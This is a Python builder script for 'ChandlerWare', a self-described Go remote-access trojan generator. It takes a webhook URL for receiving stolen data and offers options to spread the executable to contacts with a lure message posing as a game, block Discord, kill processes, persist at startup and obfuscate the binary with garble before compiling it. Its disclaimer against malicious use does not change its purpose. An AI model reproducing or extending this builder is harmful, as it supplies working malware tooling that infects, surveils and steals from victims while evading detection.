import os
import subprocess

from colorama import Fore

with open("stub/stub.go", "r") as f:
    content = f.read()

with open("stub/utils.go", "r") as f:
    utils = f.read()


# check if output/ChandlerWare.exe exists if it does delete it
if os.path.exists("output/ChandlerWare.exe"):
    os.remove("output/ChandlerWare.exe")

INFO = Fore.GREEN + "[*] " + Fore.RESET
ERROR = Fore.RED + "[!] " + Fore.RESET
QUESTION = Fore.BLUE + "[?] " + Fore.RESET



print(Fore.GREEN + fr"""
   _____ _                     _ _        __          __            
  / ____| |                   | | |       \ \        / /            
 | |    | |__   __ _ _ __   __| | | ___ _ _\ \  /\  / /_ _ _ __ ___ 
 | |    | '_ \ / _` | '_ \ / _` | |/ _ \ '__\ \/  \/ / _` | '__/ _ \
 | |____| | | | (_| | | | | (_| | |  __/ |   \  /\  / (_| | | |  __/
  \_____|_| |_|\__,_|_| |_|\__,_|_|\___|_|    \/  \/ \__,_|_|  \___|
            {Fore.RESET}Written by: {Fore.BLUE}InvisibleCat#5775{Fore.RESET}
            Github: {Fore.BLUE}https://github.com/InvisibleCatA1/ChandlerWare{Fore.RESET}                                                                                                                              
""")

print(f"{INFO} Welcome to ChandlerWare!")
print(f"{INFO} GoLang 1.18+ is required to run this tool, if you don't have it installed, please install it from "
      f"https://go.dev/dl.")
print(f"{INFO} This tool is used to generate a RAT written in GoLang.")
print(f"{INFO} This tool is not meant to be used for malicious purposes.")

# Ask for information we need to generate the RAT
url = input(f"{QUESTION} Webhook URL: ")
spread = input(f"{QUESTION} Spread (y/n): ").lower() == "y" or False
if spread:
    spread_msg = input(f"{QUESTION} Spread Message (Will contain RAT executable): ")

block = input(f"{QUESTION} Block discord (y/n): ").lower() == "y" or False
kill = input(f"{QUESTION} Kill processes (y/n): ").lower() == "y" or False
startup = input(f"{QUESTION} Start on startup (y/n): ").lower() == "y" or False
obfuscate = input(f"{QUESTION} Obfuscate (y/n): ").lower() == "y" or False


print(f"{INFO} Changing variables...")

# Replace variables in the stub
content = content.replace("weburl", url)
if spread:
    content = content.replace("SPREAD      = false", "SPREAD = true")
    content = content.replace("spread_msg", spread_msg != "" and spread_msg or "I just made this game please try it! (I need feedback lol)")
if block:
    content = content.replace("BLOCK       = false", "BLOCK = true")
if kill:
    content = content.replace("KILL        = false", "KILL = true")
if startup:
    content = content.replace("STARTUP     = false", "STARTUP = true")

print(f"{INFO} Creating output directory...")

#check if tmp exists and if not create it
if not os.path.exists("tmp"):
    os.makedirs("tmp")
print(f"{INFO} Writing stub.go...")
# Check if tmp/stub.go exists and delete it if it does
if os.path.exists("tmp/stub.go"):
    os.remove("tmp/stub.go")

print(f"{INFO} Writing utils.go...")
# same as above but for utils.go
if os.path.exists("tmp/utils.go"):
    os.remove("tmp/utils.go")

with open("tmp/new_stub.go", "w") as f:
    f.write(content)
with open("tmp/utils.go", "w") as f:
    f.write(utils)

if obfuscate:
    print(f"{INFO} Checking for obfuscation tools...")
    if subprocess.getstatusoutput("garble")[0] != 0:
        print(f"{ERROR} Garble is not installed, installing...")
        subprocess.call("go install mvdan.cc/garble@latest")
    print(f"{INFO} Obfuscating...")
    subprocess.call("garble -seed=random -debug build -o output/ChandlerWare.exe tmp/utils.go tmp/new_stub.go")
    print(f"{INFO} Obfuscation complete!")
else:
    print(f"{INFO} Building...")
    os.system("go build -o output/ChandlerWare.exe tmp/utils.go tmp/new_stub.go")
    print(f"{INFO} Build complete!")

print(f"{INFO} Cleaning up...")
print(f"{INFO} Done!")






